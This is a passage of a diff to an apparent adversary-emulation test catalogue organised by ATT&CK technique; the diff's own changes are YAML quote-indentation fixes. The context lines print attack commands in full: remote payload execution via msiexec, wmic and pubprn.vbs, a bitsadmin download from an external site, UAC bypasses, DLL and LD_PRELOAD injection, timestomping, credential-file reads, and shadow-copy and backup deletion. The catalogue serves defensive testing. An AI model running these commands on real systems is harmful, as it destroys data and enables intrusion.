       description: 'Creates and executes a simple bash script.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -11904,7 +11904,7 @@ defense-evasion:
     - name: Create and Execute Batch Script
       description: 'Creates and executes a simple batch script.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -11924,7 +11924,7 @@ defense-evasion:
           \n"
         cleanup_command: 'del #{script_to_create} >nul 2>&1
 
-'
+          '
   T1218:
     technique:
       x_mitre_data_sources:
@@ -12038,7 +12038,7 @@ defense-evasion:
       description: 'Injects arbitrary DLL into running process specified by process
         ID. Requires Windows 10.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12062,12 +12062,12 @@ defense-evasion:
         elevation_required: true
         command: 'mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}
 
-'
+          '
     - name: SyncAppvPublishingServer - Execute arbitrary PowerShell code
       description: 'Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe.
         Requires Windows 10.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12079,12 +12079,12 @@ defense-evasion:
         name: command_prompt
         command: 'SyncAppvPublishingServer.exe "n; #{powershell_code}"
 
-'
+          '
     - name: Register-CimProvider - Execute evil dll
       description: 'Execute arbitrary dll. Requires at least Windows 8/2012. Also
         note this dll can be served up via SMB
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12103,12 +12103,12 @@ defense-evasion:
         name: command_prompt
         command: 'C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
 
-'
+          '
     - name: Msiexec.exe - Execute Local MSI file
       description: 'Execute arbitrary MSI file. Commonly seen in application installation.
         The MSI opens notepad.exe when sucessfully executed.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12125,13 +12125,13 @@ defense-evasion:
         name: command_prompt
         command: 'msiexec.exe /q /i "#{msi_payload}"
 
-'
+          '
     - name: Msiexec.exe - Execute Remote MSI file
       description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
         in application installation, commonly seen in malware execution. The MSI opens
         notepad.exe when sucessfully executed.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12143,12 +12143,12 @@ defense-evasion:
         name: command_prompt
         command: 'msiexec.exe /q /i "#{msi_payload}"
 
-'
+          '
     - name: Msiexec.exe - Execute Arbitrary DLL
       description: 'Execute arbitrary DLL file stored locally. Commonly seen in application
         installation.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12167,11 +12167,11 @@ defense-evasion:
         name: command_prompt
         command: 'msiexec.exe /y "#{dll_payload}"
 
-'
+          '
     - name: Odbcconf.exe - Execute Arbitrary DLL
       description: 'Execute arbitrary DLL file stored locally.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12190,7 +12190,7 @@ defense-evasion:
         name: command_prompt
         command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
 
-'
+          '
     - name: InfDefaultInstall.exe .inf Execution
       description: |
         Test execution of a .inf using InfDefaultInstall.exe
@@ -12215,7 +12215,7 @@ defense-evasion:
         elevation_required: false
         command: 'InfDefaultInstall.exe #{inf_to_execute}
 
-'
+          '
   T1216:
     technique:
       x_mitre_data_sources:
@@ -12272,7 +12272,7 @@ defense-evasion:
       description: 'Executes the signed PubPrn.vbs script with options to download
         and execute an arbitrary payload.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12286,12 +12286,12 @@ defense-evasion:
         command: 'cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
           localhost "script:#{remote_payload}"
 
-'
+          '
     - name: SyncAppvPublishingServer Signed Script PowerShell Command Execution
       description: 'Executes the signed SyncAppvPublishingServer script with options
         to execute an arbitrary PowerShell command.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12304,12 +12304,12 @@ defense-evasion:
         elevation_required: false
         command: 'C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"
 
-'
+          '
     - name: manage-bde.wsf Signed Script Command Execution
       description: 'Executes the signed manage-bde.wsf script with options to execute
         an arbitrary command.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12325,7 +12325,7 @@ defense-evasion:
           cscript manage-bde.wsf
         cleanup_command: 'set comspec=C:\Windows\System32\cmd.exe
 
-'
+          '
   T1151:
     technique:
       x_mitre_data_sources:
@@ -12386,7 +12386,7 @@ defense-evasion:
     - name: Space After Filename
       description: 'Space After Filename
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -12448,7 +12448,7 @@ defense-evasion:
     - name: Set a file's access timestamp
       description: 'Stomps on the access timestamp of a file
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -12461,11 +12461,11 @@ defense-evasion:
         name: sh
         command: 'touch -a -t 197001010000.00 #{target_filename}
 
-'
+          '
     - name: Set a file's modification timestamp
       description: 'Stomps on the modification timestamp of a file
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -12478,7 +12478,7 @@ defense-evasion:
         name: sh
         command: 'touch -m -t 197001010000.00 #{target_filename}
 
-'
+          '
     - name: Set a file's creation timestamp
       description: |
         Stomps on the create timestamp of a file
@@ -12522,7 +12522,7 @@ defense-evasion:
         name: sh
         command: 'touch -acmr #{reference_file_path} #{target_file_path}
 
-'
+          '
     - name: Windows - Modify file creation timestamp with PowerShell
       description: |
         Modifies the file creation timestamp of a specified file.
@@ -12548,7 +12548,7 @@ defense-evasion:
           Get-ChildItem #{file_path} | % { $_.CreationTime = "#{target_date_time}" }
         cleanup_command: 'Remove-Item #{file_path} -Force
 
-'
+          '
     - name: Windows - Modify file last modified timestamp with PowerShell
       description: |
         Modifies the file last modified timestamp of a specified file.
@@ -12574,7 +12574,7 @@ defense-evasion:
           Get-ChildItem #{file_path} | % { $_.LastWriteTime = "#{target_date_time}" }
         cleanup_command: 'Remove-Item #{file_path} -Force
 
-'
+          '
     - name: Windows - Modify file last access timestamp with PowerShell
       description: |
         Modifies the last access timestamp of a specified file.
@@ -12731,7 +12731,7 @@ defense-evasion:
     - name: MSBuild Bypass Using Inline Tasks
       description: 'Executes the code in a project file using. C# Example
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12751,7 +12751,7 @@ defense-evasion:
         elevation_required: false
         command: 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe #{filename}
 
-'
+          '
   T1102:
     technique:
       x_mitre_permissions_required:
@@ -12818,7 +12818,7 @@ defense-evasion:
     - name: Reach out to C2 Pointer URLs via command_prompt
       description: 'Download data from a public website using command line
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -12827,14 +12827,14 @@ defense-evasion:
         command: 'bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/
           %TEMP%\bitsadmindownload.html
 
-'
+          '
         cleanup_command: 'del %TEMP%\bitsadmindownload.html >nul 2>&1
 
-'
+          '
     - name: Reach out to C2 Pointer URLs via powershell
       description: 'Multiple download methods for files using powershell
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -12941,7 +12941,7 @@ defense-evasion:
         transformation using a local payload. Requires download of MSXSL from Microsoft
         at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12969,13 +12969,13 @@ defense-evasion:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
 
-'
+          '
     - name: MSXSL Bypass using remote files
       description: 'Executes the code specified within a XSL script tag during XSL
         transformation using a remote payload. Requires download of MSXSL from Microsoft
         at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -12991,12 +12991,12 @@ defense-evasion:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
 
-'
+          '
     - name: WMIC bypass using local XSL file
       description: 'Executes the code specified within a XSL script using a local
         payload.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -13019,12 +13019,12 @@ defense-evasion:
         name: command_prompt
         command: 'wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
 
-'
+          '
     - name: WMIC bypass using remote XSL file
       description: 'Executes the code specified within a XSL script using a remote
         payload.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -13040,7 +13040,7 @@ defense-evasion:
         name: command_prompt
         command: 'wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}
 
-'
+          '
 privilege-escalation:
   '':
     technique:
@@ -13250,7 +13250,7 @@ privilege-escalation:
           description: 'Comma separated list of system binaries to which you want
             to attach each #{attached_process}. Default: "osk.exe"
 
-'
+            '
           type: String
           default: osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe,
             atbroker.exe
@@ -13258,7 +13258,7 @@ privilege-escalation:
           description: 'Full path to process to attach to target in #{parent_list}.
             Default: cmd.exe
 
-'
+            '
           type: Path
           default: C:\windows\system32\cmd.exe
       executor:
@@ -13352,7 +13352,7 @@ privilege-escalation:
       description: 'AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs
         to be loaded into each user mode process on the system
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -13365,7 +13365,7 @@ privilege-escalation:
         elevation_required: true
         command: 'reg.exe import #{registry_file}
 
-'
+          '
   T1138:
     technique:
       x_mitre_data_sources:
@@ -13472,7 +13472,7 @@ privilege-escalation:
     - name: New shim database files created in the default shim database directory
       description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -13487,7 +13487,7 @@ privilege-escalation:
     - name: Registry key creation and/or modification events for SDB
       description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -13614,7 +13614,7 @@ privilege-escalation:
           cmd.exe /c eventvwr.msc
         cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f
 
-'
+          '
     - name: Bypass UAC using Event Viewer (PowerShell)
       description: |
         PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
@@ -13635,12 +13635,12 @@ privilege-escalation:
         cleanup_command: 'Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse
           -ErrorAction Ignore
 
-'
+          '
     - name: Bypass UAC using Fodhelper
       description: 'Bypasses User Account Control using the Windows 10 Features on
         Demand Helper (fodhelper.exe). Requires Windows 10.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -13657,12 +13657,12 @@ privilege-escalation:
           fodhelper.exe
         cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f
 
-'
+          '
     - name: Bypass UAC using Fodhelper - PowerShell
       description: 'PowerShell code to bypass User Account Control using the Windows
         10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -13681,7 +13681,7 @@ privilege-escalation:
         cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
           -Recurse -ErrorAction Ignore
 
-'
+          '
     - name: Bypass UAC using ComputerDefaults (PowerShell)
       description: |
         PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
@@ -13704,7 +13704,7 @@ privilege-escalation:
         cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
           -Recurse -ErrorAction Ignore
 
-'
+          '
     - name: Bypass UAC by Mocking Trusted Directories
       description: |
         Creates a fake "trusted directory" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems
@@ -13899,7 +13899,7 @@ privilege-escalation:
       description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
         daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
 
-'
+        '
       supported_platforms:
       - macos
       input_arguments:
@@ -14131,7 +14131,7 @@ privilege-escalation:
     - name: Hook PowerShell TLS Encrypt/Decrypt Messages
       description: 'Hooks functions in PowerShell to read TLS Communications
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -14245,7 +14245,7 @@ privilege-escalation:
     - name: IFEO Add Debugger
       description: 'Leverage Global Flags Settings
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -14263,15 +14263,15 @@ privilege-escalation:
         command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 
-'
+          '
         cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /f
 
-'
+          '
     - name: IFEO Global Flags
       description: 'Leverage Global Flags Settings
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -14363,7 +14363,7 @@ privilege-escalation:
     - name: Launch Daemon
       description: 'Utilize LaunchDaemon to launch `Hello World`
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -14701,7 +14701,7 @@ privilege-escalation:
     - name: Plist Modification
       description: 'Modify MacOS plist file in one of two directories
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -14794,7 +14794,7 @@ privilege-escalation:
       description: 'Appends a start process cmdlet to the current user''s powershell
         profile pofile that points to a malicious executable
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -15042,7 +15042,7 @@ privilege-escalation:
         elevation_required: true
         command: 'echo #{path_to_shared_library} > /etc/ld.so.preload
 
-'
+          '
     - name: Shared Library Injection via LD_PRELOAD
       description: |
         This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.
@@ -15060,7 +15060,7 @@ privilege-escalation:
         elevation_required: false
         command: 'LD_PRELOAD=#{path_to_shared_library} ls
 
-'
+          '
     - name: Process Injection via C#
       description: |
         Process Injection using C#
@@ -15202,7 +15202,7 @@ privilege-escalation:
         elevation_required: false
         command: 'at 13:20 /interactive cmd
 
-'
+          '
     - name: Scheduled task Local
       description: "Upon successful execution, cmd.exe will create a scheduled task
         to spawn cmd.exe at 20:10. \n"
@@ -15222,10 +15222,10 @@ privilege-escalation:
         elevation_required: true
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
 
-'
+          '
         cleanup_command: 'SCHTASKS /Delete /TN spawn /F
 
-'
+          '
     - name: Scheduled task Remote
       description: "Create a task on a remote system.\n\nUpon successful execution,
         cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote
@@ -15259,10 +15259,10 @@ privilege-escalation:
         command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
-'
+          '
         cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
 
-'
+          '
     - name: Powershell Cmdlet Scheduled Task
       description: "Create an atomic scheduled task that leverages native powershell
         cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled
@@ -15282,7 +15282,7 @@ privilege-escalation:
         cleanup_command: 'Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false
           >$null 2>&1
 
-'
+          '
   T1058:
     technique:
       x_mitre_data_sources:
@@ -15422,7 +15422,7 @@ privilege-escalation:
       description: 'Make, change owner, and change file attributes on a C source code
         file
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -15448,7 +15448,7 @@ privilege-escalation:
     - name: Set a SetUID flag on file
       description: 'This test sets the SetUID flag on a file in Linux and macOS.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -15466,11 +15466,11 @@ privilege-escalation:
           sudo chmod u+s #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
 
-'
+          '
     - name: Set a SetGID flag on file
       description: 'This test sets the SetGID flag on a file in Linux and macOS.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -15488,7 +15488,7 @@ privilege-escalation:
           sudo chmod g+s #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
 
-'
+          '
   T1165:
     technique:
       x_mitre_permissions_required:
@@ -15560,10 +15560,10 @@ privilege-escalation:
         elevation_required: true
         command: 'sudo touch /Library/StartupItems/EvilStartup.plist
 
-'
+          '
         cleanup_command: 'sudo rm /Library/StartupItems/EvilStartup.plist
 
-'
+          '
   T1169:
     technique:
       x_mitre_data_sources:
@@ -15613,7 +15613,7 @@ privilege-escalation:
     - name: Sudo usage
       description: 'Common Sudo enumeration methods.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -15694,7 +15694,7 @@ privilege-escalation:
         This is dangerous to modify without using ''visudo'', do not do this on a
         production system.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -15707,7 +15707,7 @@ privilege-escalation:
       description: 'Sets sudo caching tty_tickets value to disabled. This is dangerous
         to modify without using ''visudo'', do not do this on a production system.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -15804,10 +15804,10 @@ privilege-escalation:
         name: command_prompt
         command: 'xcopy #{web_shells} #{web_shell_path}
 
-'
+          '
         cleanup_command: 'del #{web_shell_path} >nul 2>&1
 
-'
+          '
 impact:
   T1531:
     technique:
@@ -15869,7 +15869,7 @@ impact:
       description: 'Changes the user password to hinder access attempts. Seen in use
         by LockerGoga.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -15894,14 +15894,14 @@ impact:
         elevation_required: true
         command: 'net.exe user #{user_account} #{new_password}
 
-'
+          '
         cleanup_command: 'net.exe user #{user_account} /delete
 
-'
+          '
     - name: Delete User - Windows
       description: 'Deletes a user account to prevent access.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -15996,7 +15996,7 @@ impact:
       description: 'Deletes Windows Volume Shadow Copies. This technique is used by
         numerous ransomware families and APT malware such as Olympic Destroyer.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -16004,12 +16004,12 @@ impact:
         elevation_required: true
         command: 'vssadmin.exe delete shadows /all /quiet
 
-'
+          '
     - name: Windows - Delete Windows Backup Catalog
       description: 'Deletes Windows Backup Catalog. This technique is used by numerous
         ransomware families and APT malware such as Olympic Destroyer.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -16017,7 +16017,7 @@ impact:
         elevation_required: true
         command: 'wbadmin.exe delete catalog -quiet
 
-'
+          '
     - name: Windows - Disable Windows Recovery Console Repair
       description: |
         Disables repair by the Windows Recovery Console on boot.
@@ -16079,11 +16079,11 @@ impact:
         name: bash
         command: 'dd of=#{file_to_overwrite} if=#{overwrite_source}
 
-'
+          '
     - name: Windows - Delete Backup Files
       description: 'Deletes backup files in a manner similar to Ryuk ransomware.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -16092,7 +16092,7 @@ impact:
         command: 'del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
           c:\backup*.* c:\*.set c:\*.win c:\*.dsk >nul 2>&1
 
-'
+          '
   '':
     technique:
       x_mitre_data_sources:
@@ -16216,7 +16216,7 @@ impact:
       description: 'Deletes Windows Volume Shadow Copies. This technique is used by
         numerous ransomware families and APT malware such as Olympic Destroyer.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -16224,12 +16224,12 @@ impact:
         elevation_required: true
         command: 'vssadmin.exe delete shadows /all /quiet
 
-'
+          '
     - name: Windows - Delete Volume Shadow Copies via WMI
       description: 'Deletes Windows Volume Shadow Copies via WMI. This technique is
         used by numerous ransomware families and APT malware such as Olympic Destroyer.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -16237,12 +16237,12 @@ impact:
         elevation_required: true
         command: 'wmic.exe shadowcopy delete
 
-'
+          '
     - name: Windows - Delete Windows Backup Catalog
       description: 'Deletes Windows Backup Catalog. This technique is used by numerous
         ransomware families and APT malware such as Olympic Destroyer.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -16250,7 +16250,7 @@ impact:
         elevation_required: true
         command: 'wbadmin.exe delete catalog -quiet
 
-'
+          '
     - name: Windows - Disable Windows Recovery Console Repair
       description: "Disables repair by the Windows Recovery Console on boot. \nThis
         technique is used by numerous ransomware families and APT malware such as
@@ -16275,7 +16275,7 @@ impact:
         command: 'powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | ForEach-Object
           {$_.Delete();}"
 
-'
+          '
   T1496:
     technique:
       x_mitre_data_sources:
@@ -16351,7 +16351,7 @@ impact:
         name: bash
         command: 'yes > /dev/null
 
-'
+          '
   T1489:
     technique:
       x_mitre_permissions_required:
@@ -16423,7 +16423,7 @@ impact:
     - name: Windows - Stop service using Service Controller
       description: 'Stops a specified service using the sc.exe command.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -16436,14 +16436,14 @@ impact:
         elevation_required: true
         command: 'sc.exe stop #{service_name}
 
-'
+          '
         cleanup_command: 'sc.exe start #{service_name}
 
-'
+          '
     - name: Windows - Stop service using net.exe
       description: 'Stops a specified service using the net.exe command.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -16456,10 +16456,10 @@ impact:
         elevation_required: true
         command: 'net.exe stop #{service_name}
 
-'
+          '
         cleanup_command: 'net.exe start #{service_name}
 
-'
+          '
     - name: Windows - Stop service by killing process
       description: "Stops a specified service killng the service's process. \nThis
         technique was used by WannaCry.\n"
@@ -16475,7 +16475,7 @@ impact:
         elevation_required: false
         command: 'taskkill.exe /f /im #{process_name}
 
-'
+          '
   T1529:
     technique:
       x_mitre_data_sources:
@@ -16534,7 +16534,7 @@ impact:
     - name: Shutdown System - Windows
       description: 'This test shuts down a Windows system.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -16547,11 +16547,11 @@ impact:
         elevation_required: true
         command: 'shutdown /s /t #{timeout}
 
-'
+          '
     - name: Restart System - Windows
       description: 'This test restarts a Windows system.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -16564,11 +16564,11 @@ impact:
         elevation_required: true
         command: 'shutdown /r /t #{timeout}
 
-'
+          '
     - name: Restart System via `shutdown` - macOS/Linux
       description: 'This test restarts a macOS/Linux system.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -16582,11 +16582,11 @@ impact:
         elevation_required: true
         command: 'shutdown -r #{timeout}
 
-'
+          '
     - name: Shutdown System via `shutdown` - macOS/Linux
       description: 'This test shuts down a macOS/Linux system using a halt.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -16600,11 +16600,11 @@ impact:
         elevation_required: true
         command: 'shutdown -h #{timeout}
 
-'
+          '
     - name: Restart System via `reboot` - macOS/Linux
       description: 'This test restarts a macOS/Linux system via `reboot`.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -16613,11 +16613,11 @@ impact:
         elevation_required: true
         command: 'reboot
 
-'
+          '
     - name: Shutdown System via `halt` - Linux
       description: 'This test shuts down a Linux system using `halt`.
 
-'
+        '
       supported_platforms:
       - linux
       executor:
@@ -16627,7 +16627,7 @@ impact:
     - name: Reboot System via `halt` - Linux
       description: 'This test restarts a Linux system using `halt`.
 
-'
+        '
       supported_platforms:
       - linux
       executor:
@@ -16637,7 +16637,7 @@ impact:
     - name: Shutdown System via `poweroff` - Linux
       description: 'This test shuts down a Linux system using `poweroff`.
 
-'
+        '
       supported_platforms:
       - linux
       executor:
@@ -16647,7 +16647,7 @@ impact:
     - name: Reboot System via `poweroff` - Linux
       description: 'This test restarts a Linux system using `poweroff`.
 
-'
+        '
       supported_platforms:
       - linux
       executor:
@@ -16749,7 +16749,7 @@ discovery:
     - name: Enumerate all accounts
       description: 'Enumerate all accounts by copying /etc/passwd to another file
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -16762,7 +16762,7 @@ discovery:
         name: sh
         command: 'cat /etc/passwd > #{output_file}
 
-'
+          '
     - name: View sudoers access
       description: "(requires root)\n"
       supported_platforms:
@@ -16777,11 +16777,11 @@ discovery:
         name: sh
         command: 'cat /etc/sudoers > #{output_file}
 
-'
+          '
     - name: View accounts with UID 0
       description: 'View accounts wtih UID 0
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -16794,11 +16794,11 @@ discovery:
         name: sh
         command: 'grep ''x:0:'' /etc/passwd > #{output_file}
 
-'
+          '
     - name: List opened files by user
       description: 'List opened files by user
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -16806,11 +16806,11 @@ discovery:
         name: sh
         command: 'username=$(echo $HOME | awk -F''/'' ''{print $3}'') && lsof -u $username
 
-'
+          '
     - name: Show if a user account has ever logged in remotely
       description: 'Show if a user account has ever logged in remotely
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -16822,11 +16822,11 @@ discovery:
         name: sh
         command: 'lastlog > #{output_file}
 
-'
+          '
     - name: Enumerate users and groups
       description: 'Utilize groups and id to enumerate users and groups
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -16838,7 +16838,7 @@ discovery:
     - name: Enumerate users and groups
       description: 'Utilize local utilities to enumerate users and groups
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -16868,7 +16868,7 @@ discovery:
     - name: Enumerate all accounts via PowerShell
       description: 'Enumerate all accounts via PowerShell
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -16889,7 +16889,7 @@ discovery:
     - name: Enumerate logged on users
       description: 'Enumerate logged on users
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -16897,11 +16897,11 @@ discovery:
         elevation_required: false
         command: 'query user
 
-'
+          '
     - name: Enumerate logged on users via PowerShell
       description: 'Enumerate logged on users via PowerShell
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -16909,7 +16909,7 @@ discovery:
         elevation_required: false
         command: 'query user
 
-'
+          '
   T1010:
     technique:
       x_mitre_data_sources:
@@ -16978,7 +16978,7 @@ discovery:
           #{output_file_name}
         cleanup_command: 'del /f /q /s #{output_file_name} >nul 2>&1
 
-'
+          '
   T1217:
     technique:
       x_mitre_data_sources:
@@ -17026,7 +17026,7 @@ discovery:
       description: 'Searches for Mozilla Firefox''s places.sqlite file (on Linux distributions)
         that contains bookmarks and lists any found instances to a text file.
 
-'
+        '
       supported_platforms:
       - linux
       executor:
@@ -17034,12 +17034,12 @@ discovery:
         command: 'find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >>
           /tmp/firefox-bookmarks.txt \;
 
-'
+          '
     - name: List Mozilla Firefox Bookmark Database Files on macOS
       description: 'Searches for Mozilla Firefox''s places.sqlite file (on macOS)
         that contains bookmarks and lists any found instances to a text file.
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -17047,12 +17047,12 @@ discovery:
         command: 'find / -path "*/Firefox/Profiles/*/places.sqlite" -exec echo {}
           >> /tmp/firefox-bookmarks.txt \;
 
-'
+          '
     - name: List Google Chrome Bookmark JSON Files on macOS
       description: 'Searches for Google Chrome''s Bookmark file (on macOS) that contains
         bookmarks in JSON format and lists any found instances to a text file.
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -17060,31 +17060,31 @@ discovery:
         command: 'find / -path "*/Google/Chrome/*/Bookmarks" -exec echo {} >> /tmp/chrome-bookmarks.txt
           \;
 
-'
+          '
     - name: List Google Chrome Bookmarks on Windows with powershell
       description: 'Searches for Google Chromes''s Bookmarks file (on Windows distributions)
         that contains bookmarks.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
         name: powershell
         command: 'where.exe /R C:\Users\ Bookmarks
 
-'
+          '
     - name: List Google Chrome Bookmarks on Windows with command prompt
       description: 'Searches for Google Chromes''s Bookmarks file (on Windows distributions)
         that contains bookmarks.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         command: 'where /R C:\Users\ Bookmarks
 
-'
+          '
   '':
     technique:
       x_mitre_data_sources:
@@ -17161,7 +17161,7 @@ discovery:
         or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007),
         especially in a short period of time, may aid in detection.
 
-'
+        '
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
       x_mitre_contributors:
       - Sunny Neo
@@ -17289,7 +17289,7 @@ discovery:
         name: command_prompt
         command: 'dsquery * -filter "(objectClass=trustedDomain)" -attr *
 
-'
+          '
     - name: Windows - Discover domain trusts with nltest
       description: |
         Uses the nltest command to discover domain trusts.
@@ -17301,11 +17301,11 @@ discovery:
         name: command_prompt
         command: 'nltest /domain_trusts
 
-'
+          '
     - name: Powershell enumerate domains and forests
       description: 'Use powershell to enumerate AD information
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -17372,7 +17372,7 @@ discovery:
     - name: File and Directory Discovery (cmd.exe)
       description: 'Find or discover files on the file system
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -17390,7 +17390,7 @@ discovery:
     - name: File and Directory Discovery (PowerShell)
       description: 'Find or discover files on the file system
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -17425,7 +17425,7 @@ discovery:
     - name: Nix File and Directory Discovery 2
       description: 'Find or discover files on the file system
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -17614,7 +17614,7 @@ discovery:
     - name: Network Share Discovery
       description: 'Network Share Discovery
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -17645,7 +17645,7 @@ discovery:
         elevation_required: false
         command: 'net view \\#{computer_name}
 
-'
+          '
     - name: Network Share Discovery PowerShell
       description: |
         Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host
